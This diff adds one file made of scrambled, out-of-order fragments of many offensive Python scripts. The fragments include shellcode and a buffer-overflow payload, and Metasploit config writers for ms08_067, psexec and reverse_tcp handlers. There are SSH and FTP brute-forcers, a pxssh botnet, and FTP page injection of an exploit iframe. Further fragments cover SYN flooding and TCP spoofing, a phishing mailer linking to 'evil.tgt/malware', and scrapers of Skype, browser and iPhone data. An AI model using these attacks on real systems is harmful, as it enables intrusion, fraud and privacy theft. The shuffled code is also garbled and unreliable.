@@ -1,0 +1,902 @@
+    parser = optparse.OptionParser("usage %prog '+'-p <pcap file> -t <thresh>" )
+def retGeoStr(ip):
+    host = 'localhost'
+def printPcap(pcap):
+            exit(0)
+    global Fails
+        filename = os.path.join(dir,filename.replace('/', '_'))
+                search=search.replace('q=', '').replace('+', ' ')
+import re
+    pF = open(passwdFile, 'r')
+        s = pxssh.pxssh()
+    long = rec['longitude']
+        THRESH = options.thresh
+class Google_Result:
+    if options.count == None:
+    url = options.url
+    dirs=['C:\\Recycler\\','C:\\Recycled\\','C:\\$Recycle.Bin\\']
+    findRecycled(recycledDir)
+import os
+        rec = gi.record_by_name(ip)
+    user = options.user
+    pkts = rdpcap('domainFlux.pcap')
+    mapLon = 'N/A'
+import nmap
+        imgFile = open(imgFileName, 'wb')
+        ans = sr1(pkt, verbose=0)
+      help='specify PDF file name')
+    sniff(prn=testTTL, store=0)
+        return user
+def testForExif(imgFileName):
+def addClient(host, user, password):
+def scanTest(src, dst, iface, count):
+          'windows/meterpreter/reverse_tcp\\n')
+            return False
+        title = result['titleNoFormatting']
+    parser.add_option('-H', dest='tgtHost', type='string',  help='specify target host')
+for attempt in range(1, 5):
+    addr = addr.strip(' ').replace(' ', ':')[0:17]
+    user = options.user
+    except:
+    parser.add_option('-k', dest='keyword', type='string',      help='specify google keyword')
+     platform = sys.argv[2]
+    parser = optparse.OptionParser('usage %prog ' +      '-k <keywords>')
+    rec = gi.record_by_name(tgt)
+        child = t.start()
+                    pass
+        country = rec['country_code3']
+    parser = optparse.OptionParser('usage %prog -H '+ '<target host> -u <user> -d <directory>')
+        conf.iface = options.iface
+            host = str(row[0])
+    tgtHosts = findTgts(options.tgtHost)
+    global Found
+    host = options.tgtHost
+    for item in dnsRecords:
+                return True
+    for sid in dirList:
+    scanTest(src, dst, iface, count)
+    respURL = 'http://wigle.net/gps/gps/main/confirmquery/'
+                if '!lazor' in tcp.data.lower():
+    configFile.write('set payload '+\
+from _winreg import *
+"\xde\xf4\x5b\x8c\xf1\x58\xd5\x6a\x9b\x70\xb3\x25\x33\xb3" 
+import ftplib
+            if sport == 6667:
+bruteLogin(host, passwdFile)
+injectPage(ftp, 'index.html', redirect)
+        self.url = url
+        if pktsSent > THRESH:
+        imgFile.write(imgContent)
+    c.execute("select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;")
+    else:
+        results.append(new_gr)
+    if not ttlValues.has_key(ipsrc):
+def mirrorImages(url, dir):
+    parser.add_option('-u', dest='tgtURL', type='string',  help='specify target url')
+    except:
+screenLock = Semaphore(value=1)
+    return kmlPts
+            break
+    parser.add_option('-u', dest='user', type='string', help='specify the user')
+    pcap = dpkt.pcap.Reader(f)
+            printHistory(placesDB)
+        IPlayer = IP(src=src, dst=tgt)
+    ab.anonymize()
+        send(pkt)
+s = connect('127.0.0.1', 'root', 'toor')
+    mapLat = 'N/A'
+    (options, args) = parser.parse_args()
+    for result in objects['responseData']['results']:
+hideMeProxy = {'http': '216.155.139.115:3128'}
+if len(sys.argv) > 2:
+    page = browser.open(url)
+s.send("PASS \r\\n")
+            ip = eth.data
+        tgt = options.tgt
+    pdfFile = PdfFileReader(file(fileName, 'rb'))
+    parser.add_option('-F', dest='fileName', type='string',\
+                    msgDirection = 'From ' + str(row[2]) + ' : '
+    TCPlayer = TCP(sport=513, dport=514)
+    nmScan = nmap.PortScanner()
+        return self.title
+    for line in pF.readlines():
+        screenLock.acquire()
+    tgtHost = options.tgtHost
+        info = imgFile._getexif()
+        self.text = text
+        perm_denied = 'Permission denied'
+        if 'encrypted' in str(e):
+import optparse
+        s = pxssh.pxssh()
+dnsRecords = {}
+    (options, args) = parser.parse_args()
+            (n, name, t) = EnumValue(netKey, 4)
+        dst = options.tgt
+    parser = optparse.OptionParser('usage %prog '+ '-H <target host> -p <target port>')
+anonLogin(host)
+from PIL.ExifTags import TAGS
+from BeautifulSoup import BeautifulSoup
+def anonLogin(hostname):
+        pass
+import sqlite3
+def botnetCommand(command):
+                except:
+        if preNum != 0:
+printRecord(tgt)
+            date = str(row[0])
+            if 'partlist' not in str(row[3]):
+        THRESH = 5
+        tgtName = gethostbyaddr(tgtIP)
+        printNets(username, password)
+        configFile.write('set LPORT ' + str(lport) + '\\n')
+        ttlValues[ipsrc] = pkt.ttl
+    portScan(tgtHost, tgtPorts)
+    if options.thresh != None:
+    if url == None:
+        return self.session.before
+s.send("USER anonymous\r\\n")
+        mapLon = rLon[0].split
+crash = "\x41" * 246 + ret + padding + shellcode
+        ab.back()
+import cookielib
+            value = str(row[2])
+command = sys.argv[2]
+        return ''
+    else:
+    s.sendline(cmd)
+from pyPdf import PdfFileReader
+    soup = BeautifulSoup(urlContent)
+        save.close()
+    configFile.write('use exploit/windows/smb/ms08_067_netapi\\n')
+        c.execute('SELECT tbl_name FROM sqlite_master WHERE type==\"table\";')
+import pexpect
+    kmldoc=kmlheader+plotIPs(pcap)+kmlfooter
+ab = anonBrowser(proxies=[],user_agents=[('User-agent','superSecretBroswer')])
+def main():
+connection_lock = BoundedSemaphore(value=maxConnections)
+    (options, args) = parser.parse_args()
+    passwdFile = options.passwdFile
+        configFile.write('use exploit/windows/smb/psexec\\n')
+    client = Client(host, user, password)
+    c.execute("SELECT datetime(timestamp,'unixepoch'),dialog_partner, author, body_xml FROM Messages;")
+            s = pxssh.pxssh()
+        configFile.write('set payload '+\
+    if options.pcapFile == None:
+    def __repr__(self):
+    return results
+    parser.add_option('-d', dest='dir', type='string',help='specify destination directory')
+        self.password = password
+"\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8"
+def printNets(username, password):
+"\x56\x22\x1c\x43\x22\x98\x1f\x94\x9a\x97\x68\x0c\x91\xf0" 
+    f = open(pcapFile)
+        c.execute("select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;")
+        elif ret == 3:
+    page = ab.open(url)
+def printContacts(skypeDB):
+    child = pexpect.spawn(connStr)
+    html = page.read()
+def findRecycled(recycleDir):
+    pkt = IP(src=src,dst=dst)/UDP(dport=31335)/Raw(load='PONG')
+                decoded = TAGS.get(tag, tag)
+				    def __init__(self, handle):
+        self.handle = handle
+        self.tweets = self.get_tweets()
+    def get_tweets(self):
+        query = urllib.quote_plus('from:' + self.handle+ ' since:2009-01-01 include:retweets')
+        tweets = []
+        browser = anonBrowser()
+        browser.anonymize()
+        response = browser.open('http://search.twitter.com/'+ 'search.json?q=' + query)
+        json_objects = json.load(response)
+        for result in json_objects['results']:
+            new_result = {}
+            new_result['from_user'] = result['from_user_name']
+            new_result['geo'] = result['geo']
+            new_result['tweet'] = result['text']
+            tweets.append(new_result)
+        return tweets
+    def find_interests(self):
+        interests = {}
+        interests['links'] = []
+        interests['users'] = []
+        interests['hashtags'] = []
+            text = tweet['tweet']
+            links = re.compile().findall(text)
+            for link in links:
+                if link[0]:
+                    link = link[0]
+                elif link[1]:
+                    link = link[1]
+                else:
+                    continue
+                response = urllib2.urlopen(link)
+                full_link = response.url
+                interests['links'].append(full_link)
+            except:
+            interests['users'] +=  re.compile('(@\w+)').findall(text)
+            interests['hashtags'] +=               re.compile('(#\w+)').findall(text)
+        interests['users'].sort()
+        interests['hashtags'].sort()
+        interests['links'].sort()
+        return interests
+    def twitter_locate(self, cityFile):
+        cities = []
+        if cityFile != None:
+            for line in open(cityFile).readlines():
+                city = line.strip('\\n').strip('\r').lower()
+                cities.append(city)
+        locations = []
+        locCnt = 0
+        cityCnt = 0
+        tweetsText = ''
+        for tweet in self.tweets:
+            if tweet['geo'] != None:
+                locations.append(tweet['geo'])
+                locCnt += 1
+            tweetsText += tweet['tweet'].lower()
+        for city in cities:
+            if city in tweetsText:
+                locations.append(city)
+                cityCnt += 1
+        return locations
+    query = urllib.quote_plus('from:' + handle+       ' since:2009-01-01 include:retweets')
+    response = browser.open('http://search.twitter.com/'+      'search.json?q='+ query)
+def load_cities(cityFile):
+    cities = []
+    for line in open(cityFile).readlines():
+city=line.strip('\\n').strip('\r').lower()
+cities.append(city)
+    return cities
+def twitter_locate(tweets,cities):
+    locations = []
+    locCnt = 0
+    cityCnt = 0
+    tweetsText = ""
+        if tweet['geo'] != None:
+            locations.append(tweet['geo'])
+            locCnt += 1 
+tweetsText += tweet['tweet'].lower()
+    for city in cities:
+if city in tweetsText:
+    locations.append(city)
+    cityCnt+=1
+return locations
+def main():
+    parser = optparse.OptionParser('usage %prog '+     '-u <twitter handle> [-c <list of cities>]')
+    parser.add_option('-c', dest='cityFile', type='string',help='specify file containing cities to search')
+    cityFile = options.cityFile
+    if (handle==None):
+    exit(0)
+    cities = []
+    if (cityFile!=None):
+ cities = load_cities(cityFile)
+    locations = twitter_locate(tweets,cities)
+import re
+import urllib2
+def get_tweets(handle):
+    query = urllib.quote_plus('from:' + handle+      ' since:2009-01-01 include:retweets')
+    tweets = []
+    browser = anonBrowser()
+    browser.anonymize()
+    response = browser.open('http://search.twitter.com/'+      'search.json?q=' + query)
+    json_objects = json.load(response)
+    for result in json_objects['results']:
+        new_result = {}
+        new_result['from_user'] = result['from_user_name']
+        new_result['geo'] = result['geo']
+        new_result['tweet'] = result['text']
+        tweets.append(new_result)
+    return tweets
+def find_interests(tweets):
+    interests = {}
+    interests['links'] = []
+    interests['users'] = []
+    interests['hashtags'] = []
+    for tweet in tweets:
+        text = tweet['tweet']
+        links = re.compile().findall(text)
+        for link in links:
+            if link[0]:
+                link = link[0]
+            elif link[1]:
+                link = link[1]
+            else:
+                continue
+            try:
+                response = urllib2.urlopen(link)
+                full_link = response.url
+                interests['links'].append(full_link)
+            except:
+                pass
+        interests['users'] += re.compile('(@\w+)').findall(text)
+        interests['hashtags'] +=           re.compile('(#\w+)').findall(text)
+    interests['users'].sort()
+    interests['hashtags'].sort()
+    interests['links'].sort()
+    return interests
+def main():
+    parser = optparse.OptionParser('usage %prog '+      '-u <twitter handle>')
+    parser.add_option('-u', dest='handle', type='string',      help='specify twitter handle')
+    if handle == None:
+        exit(0)
+    tweets = get_tweets(handle)
+    interests = find_interests(tweets)
+import json
+import urllib
+from anonBrowser import *
+class reconPerson:
+    def __init__(self,first_name,last_name,      job='',social_media={}):
+        self.first_name = first_name
+        self.last_name = last_name
+        self.job = job
+        self.social_media = social_media
+    def __repr__(self):
+        return self.first_name + ' ' +          self.last_name + ' has job ' + self.job
+    def get_social(self, media_name):
+        if self.social_media.has_key(media_name):
+            return self.social_media[media_name]
+        return None
+    def query_twitter(self, query):
+        query = urllib.quote_plus(query)
+        results = []
+        browser = anonBrowser()
+        response = browser.open(          'http://search.twitter.com/search.json?q='+ query)
+        json_objects = json.load(response)
+        for result in json_objects['results']:
+            new_result = {}
+            new_result['from_user'] = result['from_user_name']
+            new_result['geo'] = result['geo']
+            new_result['tweet'] = result['text']
+            results.append(new_result)
+        return results
+ap = reconPerson('Boondock', 'Saint')
+user = 'username'
+pwd = 'password'
+sendMail(user, pwd, 'target@tgt.tgt'  'Re: Important', 'Test Message')
+import smtplib
+import optparse
+from email.mime.text import MIMEText
+from twitterClass import *
+from random import choice
+def sendMail(user,pwd,to,subject,text):
+    msg = MIMEText(text)
+    msg['From'] = user
+    msg['To'] = to
+    msg['Subject'] = subject
+    try:
+smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
+smtpServer.starttls()
+smtpServer.ehlo()
+smtpServer.login(user, pwd)
+smtpServer.sendmail(user, to, msg.as_string())
+smtpServer.close()
+    except:
+     pass
+def main():
+    parser = optparse.OptionParser('usage %prog '+      '-u <twitter target> -t <target email> '+      '-l <gmail login> -p <gmail password>')
+    parser.add_option('-u', dest='handle', type='string',      help='specify twitter handle')
+    parser.add_option('-t', dest='tgt', type='string',      help='specify target email')
+    parser.add_option('-l', dest='user', type='string',      help='specify gmail login')
+    parser.add_option('-p', dest='pwd', type='string',      help='specify gmail password')
+    (options, args) = parser.parse_args()
+    handle = options.handle
+    tgt = options.tgt
+    user = options.user
+    pwd = options.pwd
+    if handle == None or tgt == None      or user ==None or pwd==None:
+        exit(0)
+    spamTgt = reconPerson(handle)
+    spamTgt.get_tweets()
+    interests = spamTgt.find_interests()
+    location = spamTgt.twitter_locate('mlb-cities.txt')
+    spamMsg = "Dear "+tgt+","
+    if (location!=None):
+randLoc=choice(location)
+spamMsg += " Its me from "+randLoc+"."
+    if (interests['users']!=None):
+randUser=choice(interests['users'])
+spamMsg += " "+randUser+" said to say hello."
+    if (interests['hashtags']!=None):
+randHash=choice(interests['hashtags'])
+spamMsg += " Did you see all the fuss about "+          randHash+"?"
+    if (interests['links']!=None):
+randLink=choice(interests['links'])
+spamMsg += " I really liked your link to: "+          randLink+"."
+    spamMsg += " Check out my link to http://evil.tgt/malware"
+    sendMail(user, pwd, tgt, 'Re: Important', spamMsg)
+	            connect(user, host, keyfile, False)
+    IPlayer = IP(src=src, dst=tgt)
+"\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7" 
+    send(pkt)
+    parser = optparse.OptionParser('usage %prog "+\
+    if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
+            if isMessageTable(iphoneDB):
+import mechanize
+    browser.set_cookiejar(cookie_jar)
+            dst = stream.split(':')[1]
+            CloseKey(netKey)
+def nmapScan(tgtHost,tgtPort):
+Fails = 0
+    parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
+        printLinks(url)
+testProxy(url, hideMeProxy)
+import ftplib, time
+"\xe0\xfd\xa4\xcc\xc2\x51\x7d\x5b\x5a\xbc\xb9\x64\x5b\xea" 
+"\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
+        c = conn.cursor()
+botnetCommand('cat /etc/issue')
+            printDownloads(downloadDB)
+    password = 'toor'
+        ftp = ftplib.FTP(hostname)
+        if '.php' in fn or '.htm' in fn or '.asp' in fn:
+            netName = str(name)
+    configFile.close()
+          args=(user, host, fullpath, True))
+"\x41\x28\x01\xe5\x3c\x6d\x3e\xca\xa8\x79\x47\x36\x49\x85" 
+    findHivemind(pcap)
+        return
+    ackPkt = IPlayer / TCPlayer
+        tgtIP = gethostbyname(tgtHost)
+import os
+def printProfile(skypeDB):
+        pkt = sr1(IP(dst=ipsrc),ICMP(), retry=0, timeout=1, verbose=0)
+import urllib
+        iface = options.iface
+class Client:
+        if dnsRecords.has_key(rrname):
+def wiglePrint(username, password, netid):
+    if IPTEST(ipsrc).iptype() == 'PRIVATE':
+returnDefault(ftp)
+    pathName = options.pathName
+            smbBrute(configFile,tgtHost,passwdFile,lhost,lport)
+def isMessageTable(iphoneDB):
+def spoofConn(src, tgt, ack):
+import sys
+        conn = sqlite3.connect(cookiesDB)
+    parser.add_option('-t', dest='thresh', type='int',help='specify threshold count ')
+def connScan(tgtHost, tgtPort):
+    except:
+             child = t.start()
+import urllib2
+    region = rec['region_name']
+def connect(user,host,keyfile,release):
+"\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c" 
+        fn = fileName.lower()
+        diffSeq = seqNum - preNum
+        exit(0)
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    elif os.path.isdir(pathName) == False:
+    child.expect(PROMPT)
+    child = connect(user, host, password)
+    try:
+     return False
+    parser.add_option('-p', dest='pcapFile', type='string',      help='specify pcap filename')
+def testTTL(pkt):
+import nmap
+            name = str(row[1])
+            unAnsReqs = unAnsReqs + 1
+"\xbd\xca\x85\xe3\xd7\xc4\xfa\x14\xd8\x0e\x8d\x12\x16\x6a" 
+            if 'message' in str(row):
+            geoLoc = country
+def main():
+        data = ab.open(image['src']).read()
+    preNum = 0
+import os
+            ipsrc = pkt.getlayer(IP).src
+Found = False
+    for sport in range(1024,65535):
+    params['netid'] = netid
+from scapy.all import *
+        downloadDB = os.path.join(pathName, 'downloads.sqlite')
+        return False
+        if Stop:
+"\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10" 
+    ftp.storlines('STOR ' + page, open(page + '.tmp'))
+    nmScan = nmap.PortScanner()
+    parser.add_option('-u', dest='username', type='string',
+        self.title = title
+    for client in botNet:
+Fails = 0
+import pxssh
+    conn = sqlite3.connect(skypeDB)
+    for host in nmScan.all_hosts():
+    parser = optparse.OptionParser('usage %prog '+\
+             t = Thread(target=connect, args=(host, user,\
+    nmScan.scan(tgtHost,tgtPort)
+def printCookies(cookiesDB):
+padding = "\x90" * 150
+    for filename in os.listdir(passDir):
+        connection_lock.acquire()
+    city = rec['city']
+PROMPT = ['# ', '>>> ', '> ','\$ ']
+        c.execute('select datetime(date,\'unixepoch\'),address, text from message WHERE address>0;')
+    if options.tgt == None:
+    if host == None or passwdFile == None or user == None:
+    return tgtHosts
+def checkTTL(ipsrc, ttl):
+userName = 'guest'
+        connSkt.send('ViolentPython\r\\n')
+    if ret == 0:
+            state = nmScan[host]['tcp'][445]['state']
+        if release:
+if __name__ == '__main__':
+import socket,sys,time,struct
+    pcapFile = options.pcapFile
+    browser.open('https://wigle.net/gps/gps/main/login', reqData)
+import re
+import socket
+        return ''
+    username = options.username
+        if pkt.haslayer(IP):
+                               'credential_1': password})
+    pkts = rdpcap('fastFlux.pcap')
+ftp.login(userName, passWord)
+    f.close()
+      '-u <wigle username> -p <wigle password>')
+            netKey = OpenKey(key, str(guid))
+userName = 'guest'
+    parser.add_option('-u', dest='user', type='string',help='specify the user')
+    for password in pF.readlines():
+        except:
+            return True
+import optparse
+import pyPdf
+def handlePkt(pkt):
+        self.session.sendline(cmd)
+        date = str(row[1])
+    configFile.write('exploit -j -z\\n')
+        qname = pkt.getlayer(DNSQR).qname
+            eth = dpkt.ethernet.Ethernet(buf)
+url = 'http://www.syngress.com/'
+    parser = optparse.OptionParser("usage %prog "+"-p <iPhone Backup Directory> ")
+        return s
+        conn = sqlite3.connect(placesDB)
+    if Found:
+    url = options.tgtURL
+            return recycleDir
+            iphoneDB = os.path.join(pathName, fileName)
+    return imgTags
+    browser = mechanize.Browser()
+    c = conn.cursor()
+def main():
+    if ret == 1:
+    host = options.tgtHost
+    connect(host, user, password, False)
+    parser.add_option('-p', dest='pcapFile', type='string',help='specify pcap filename')
+        conn = sqlite3.connect(iphoneDB)
+def printHistory(placesDB):
+        key = OpenKey(HKEY_LOCAL_MACHINE,
+Stop = False
+    def connect(self):
+"\x63\x4d\xe7\x79\x74\xb2\xd2\x3e\xea\x4d\xdc\x3e\x22\x8a" 
+        dirList = []
+    pF = open(passwdFile, 'r')
+        self.host = host
+    response = ab.open('http://ajax.googleapis.com/'+       'ajax/services/search/web?v=1.0&q='+ search_term)
+        screenLock.close()
+        imgTags = findImages(url)
+def printMessage(msgDB):
+    parser.add_option('-u', dest='tgtURL', type='string',  help='specify target url')
+def plotIPs(pcap):
+        results = connSkt.recv(100)
+            Fails += 1
+def setupHandler(configFile, lhost, lport):
+            exifGPS = exifData['GPSInfo']
+    browser.addheaders = userAgent
+        addr += '%02x ' % ord(ch)
+            sport = tcp.sport
+    sys.exit(0)
+        connStr = 'ssh ' + user +\
+            (n, addr, t) = EnumValue(netKey, 5)
+    passDir = options.passDir
+def bruteLogin(hostname, passwdFile):
+        ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',])
+    if fileName == None:
+    lport = options.lport
+        save = open(filename, 'wb')
+    c.execute("SELECT datetime(begin_timestamp,'unixepoch'),  identity FROM calls, conversations WHERE  calls.conv_dbid = conversations.id;")
+host = '192.168.95.179'
+            printCookies(cookiesDB)
+"\x7a\xfc\xe3\x7f\xc6\xda\xf3\xb9\xc7\x66\xa7\x15\x9e\x30" 
+                search=r[0].split('&')[0]
+        userName = line.split(':')[0]
+    net = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"+\
+        nmapScan(tgtHost, tgtPort)
+          '@' + host + ' -i ' + keyfile + opt
+    printPcap(pcap)
+            if dport == 80:
+        imgContent = urllib2.urlopen(imgSrc).read()
+        exifData = {}
+        if os.path.isfile(downloadDB):
+        elif ret > 3:
+    if options.src == None:
+            connection_lock.release()
+    if options.iface == None:
+        s.login(host, user, password)
+    ssh_newkey = 'Are you sure you want to continue connecting'
+        src = '.'.join([str(randint(1,254)) for x in range(4)])
+import re
+    lhost = options.lhost
+    if lport == None:
+                if pktCount.has_key(stream):
+        try:
+    child.sendline(password)
+            connect(host, user, password, False)
+def connect(host, user, password, release):
+        except:
+def findImages(url):
+            src = stream.split(':')[0]
+    if options.keyword == None:
+        if dnsQRTest(pkt):
+    except:
+    results = []
+    nmScan.scan(subNet, '445')
+    ab = anonBrowser()
+    finally:
+ttlValues = {}
+    if host == None or passDir == None or user == None:
+import re
+        for imgTag in imgTags:
+def portScan(tgtHost, tgtPorts):
+        ret = child.expect([pexpect.TIMEOUT, \
+def retKML(ip):
+        c.execute('SELECT host, name, value FROM moz_cookies')
+        ftp.quit()
+    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
+        seqNum = ans.getlayer(TCP).seq
+    time.sleep(1)
+botNet = []
+                    pktCount[stream] = pktCount[stream] + 1
+"\x92\xf2\x79\xcc\xbe\x53\x12\x89\x2b\xe6\x7f\x2a\x86\x25" 
+        imgFile = Image.open(imgFileName)
+ftp = ftplib.FTP(host)
+"\x6b\x1e\xfb\x7e\x2d\xfa\xaa\x7f\x2d\xa2\x13\xda\x25\x41" 
+    if pathName == None:
+        if info:
+        ssh_newkey = 'Are you sure you want to continue'
+    TCPlayer = TCP(sport=513, dport=514, ack=ack)
+import pygeoip
+import pygeoip
+    reqParams = urllib.urlencode(params)
+from os.path import basename
+            imgFileName = downloadImage(imgTag)
+        user = sid2user(sid)
+maxConnections = 5
+THRESH = 5
+        configFile.write('set LHOST ' + lhost + '\\n')
+from socket import *
+        lport = '1337'
+            time.sleep(5)
+        for row in c:
+        placesDB = os.path.join(pathName, 'places.sqlite')
+    fileName = options.fileName
+    child.sendline(cmd)
+        else:
+    kmlfooter = '</Document>\\n</kml>\\n'
+        filename = image['src'].lstrip('http://')
+    ddosTest(src, dst, iface, count)
+def findDownload(pcap):
+    imgTags = soup.findAll('img')
+    html = ab.open(url)
+                if '.zip' in uri and 'loic' in uri:
+            for (tag, value) in info.items():
+import optparse
+import socket
+    for i in range(100):
+    recycledDir = returnDir()
+    configFile.write('set LPORT ' + str(lport) + '\\n')
+        conn_closed = 'Connection closed by remote host'
+def google(search_term):
+    ab = anonBrowser()
+import socket
+        count = options.count
+        (value, type) = QueryValueEx(key, 'ProfileImagePath')
+            exit(0)
+    pkt = IP(src=src, dst=dst) / UDP(dport=518)  /Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
+        return
+    finally:
+            testForExif(imgFileName)
+    parser = optparse.OptionParser("usage %prog "+"-i <interface> -t <thresh>")
+    diffSeq = 0
+    for pkt in pkts:  
+botnetCommand('uname -v')
+host = '192.168.95.179'
+    state=nmScan[tgtHost]['tcp'][int(tgtPort)]['state']
+            dstKML = retKML(dst)
+"\x40\x5c\x64\x0e\xa5\x53\x97\xce\xa1\xe4\xe4\xfc\x6e\x5f" 
+"\x88\x6e\x5c\x3b\xb0\xe4\x9c\xc4\x65\xaa\xcc\x6a\xd5\x0b" 
+    conn = sqlite3.connect(downloadDB)
+    return (None, None)
+maxConnections = 5
+    main()
+      "-F <PDF file name>')
+            pass
+    parser = optparse.OptionParser('usage %prog -p <pcap file>')
+    (options, args) = parser.parse_args()
+        return
+            geoLoc = city + ', ' + country
+        count = 1
+            if http.method == 'GET':
+"\xce\x10\xc3\x86\xd1\xf5\x7f\xb2\x5a\xf8\xaf\x32\x18\xdf" 
+        rcode = pkt.getlayer(DNS).rcode
+    def send_command(self, cmd):
+    f = open(page + '.tmp', 'w')
+"\xac\x31\x64\x1f\x38\xac\xdf\x89\x5e\x2d\xb9\xf2\xda\xea" 
+        time.sleep(1)
+    synPkt = IPlayer / TCPlayer
+import json
+    rLon = re.findall(r'maplon=.*\&', resp)
+    for stream in pktCount:
+    botNet.append(client)
+    spoofConn(srcSpoof, tgt, seqNum)
+import urllib2
+    parser.add_option('-d', dest='passDir', type='string',help='specify directory with keys')
+        return kml
+import optparse
+def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
+        handlePkt(pkt)
+        output = client.send_command(command)
+        exit(0)
+def findTgts(subNet):
+    search_term = urllib.quote_plus(search_term)
+from urlparse import urlsplit
+        if os.path.isfile(placesDB):
+    return child
+    (options, args) = parser.parse_args()
+    docInfo = pdfFile.getDocumentInfo()
+        results = google(keyword)
+    c.execute("SELECT fullname, skypename, city, country,  datetime(profile_timestamp,'unixepoch') FROM Accounts;")
+    configFile.write('use exploit/multi/handler\\n')
+        for fileName in dirList:
+    def __init__(self,title,text,url):
+testUserAgent(url, userAgent)
+                dnsRecords[rrname].append(rdata)
+         exit(0)
+        pkt = IPlayer / TCPlayer
+def testProxy(url, proxy):
+def returnDir():
+        city = rec['city']
+def injectPage(ftp, page, redirect):
+        kml = (               '<Placemark>\\n', '<name>%s</name>\\n',  '<Point>\\n', '<coordinates>%6f, %6f</coordinates>\\n',           '</Point>\\n','</Placemark>\\n')
+def exploitTest(src, dst, iface, count):
+import optparse
+    configFile.write('set LPORT ' + str(lport) + '\\n')
+def confickerExploit(configFile,tgtHost,lhost,lport):
+            checkTTL(ipsrc, ttl)
+    for (ts, buf) in pcap:
+        configFile.write('set SMBPass ' + str(password) + '\\n')
+    except Exception, e:
+except:
+ret = struct.pack('<L', 0x7C874413)
+            mirrorImages(url, dir)
+    user = 'root'
+    parser = optparse.OptionParser('usage %prog ' +'-u <target url>')
+def printCookies(url):
+  '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
+    for fileName in dirList:
+            addr = str(row[1])
+    retList = []
+    parser.add_option('-p', dest='pathName', type='string',help='specify skype profile path')
+    synFlood(synSpoof, srcSpoof)
+    send(pkt, iface=iface, count=count)
+    def __init__(self, host, user, password):
+    setdefaulttimeout(1)
+          pass
+    pcap = dpkt.pcap.Reader(f)
+        imgSrc = imgTag['src']
+        if rcode == 3:
+        cookiesDB = os.path.join(pathName, 'cookies.sqlite')
+        return 'Unregistered'
+"\xf6\xcb\x27\x12\xeb\x6c\xac\x84\xcf\x8d\x61\x52\x9b\x82" 
+    global Stop
+        s.login(host, user, password)
+        t = Thread(target=connScan,args=(tgtHost,int(tgtPort)))
+redirect = '<iframe src='+\
+        imgFile.close()
+pass
+    response = ab.open('http://ajax.googleapis.com/'+      'ajax/services/search/web?v=1.0&q='+ search_term)
+    os.system('msfconsole -r meta.rc')
+        self.session.prompt()
+        exit(0)
+    unAnsReqs = 0
+def printPcap(pcap):
+    exploitTest(src, dst, iface, count)
+        configFile.write('set SMBUser ' + str(username) + '\\n')
+ftp = ftplib.FTP(host)
+    return None
+    parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
+from PIL import Image
+    (options, args) = parser.parse_args()
+        if Fails > 5:
+    resp = browser.open(respURL, reqParams).read()
+        self.session = self.connect()
+"\x11\xd0\x48\xf3\xcb\x8a\x27\x5d\x9b\x4b\x04\x5e\xdd\x53" 
+    setupHandler(configFile, lhost, lport)
+def viewPage(url):
+    return retList
+url = 'http://whatismyuseragent.dotdoh.com/'
+        save.write(data)
+        t = Thread(target=connect,\
+    except:
+        return sid
+    parser = optparse.OptionParser('usage %prog '+ '-u <target url> -d <destination directory>')
+import optparse
+    (options, args) = parser.parse_args()
+    c.execute('SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;')
+    finally:
+    keyword = options.keyword
+    fn = open(passwdFile, 'r')
+def printRecord(tgt):
+                    msgDirection = 'To ' + str(row[1]) + ': '
+            macAddr = val2addr(addr)
+    connStr = 'ssh ' + user + '@' + host
+            return s
+            url = str(row[0])
+        if 'google' in url.lower():
+        if city != '':
+    objects = json.load(response)
+                if str(row[1]) != str(row[2]):
+    parser = optparse.OptionParser('usage %prog "+"-u <target url>')
+tgt = '173.255.226.98'
+    tgtHosts = []
+        conf.iface = 'eth0'
+        configFile.write('set RHOST ' + str(tgtHost) + '\\n')
+    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
+    if url == None:
+    username = 'Administrator'
+    response = ab.open('http://ajax.googleapis.com/'+      'ajax/services/search/web?v=1.0&q='+ search_term)
+    pkt = IP(src=src, dst=dst) / UDP(dport=10080)  /Raw(load='Amanda')
+    pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
+            http = dpkt.http.Request(tcp.data)
+gi = pygeoip.GeoIP('/opt/GeoIP/Geo.dat')
+    c.execute("SELECT displayname, skypename, city, country,phone_mobile, birthday FROM Contacts;")
+def send_command(s, cmd):
+    parser.add_option('-p', dest='password', type='string',
+    f.write(redirect)
+    return seqNum + diffSeq
+target = sys.argv[1]
+    configFile.write('set LHOST ' + lhost + '\\n')
+    for row in c:
+            if rdata not in dnsRecords[rrname]:
+    parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
+    key = OpenKey(HKEY_LOCAL_MACHINE, net)
+    parser.add_option('-p', dest='pcapFile', type='string',  help='specify pcap filename')
+from random import randint
+passwdFile = 'userpass.txt'
+        except Exception, e:
+        rrname = pkt.getlayer(DNSRR).rrname
+    configFile.write('set LHOST ' + lhost + '\\n')
+            dst = socket.inet_ntoa(ip.dst)
+    pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
+    params = {}
+    for (ts, buf) in pcap:
+    if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53:
